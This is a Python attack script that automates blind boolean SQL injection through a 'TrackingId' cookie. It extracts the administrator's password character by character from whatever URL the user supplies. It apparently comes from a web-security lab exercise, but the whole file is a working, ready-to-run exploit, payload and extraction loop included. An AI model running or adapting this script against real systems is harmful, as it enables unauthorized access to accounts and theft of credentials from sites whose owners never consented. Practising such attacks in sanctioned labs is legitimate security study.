import sys
import requests
import urllib3
import urllib
import click

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}


def injection(url):
    password_extracted=""
    for i in range (1,21):
        for j in range(32,126): # ASCII number of all the characters
            sqli_payload="' and (select ascii(substring(password,%s,1)) from users where username='administrator') = '%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload) #URL Encode the Paylod
            cookies = {'TrackingId' : 'HU6TAHMzoMHSPTLi' + sqli_payload_encoded, 'session' : 'e4dl6GMF4kUGNPmGD8SBkGFVWL4ckalq'}
            
            r = requests.get(url, cookies=cookies, verify=False)
            
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extracted + chr(j)) # this function doesn't appen a newline by default
                sys.stdout.flush() #making sure the output is written immediatly
            else:
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break


@click.command()
@click.option('-u','--url',type=str, prompt="The URL of the target",required=True,help="The URL of the vulnerable target")
def main(url):
    print("[+] Retrieving Administrator's Password...")
    injection(url)
    
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting program")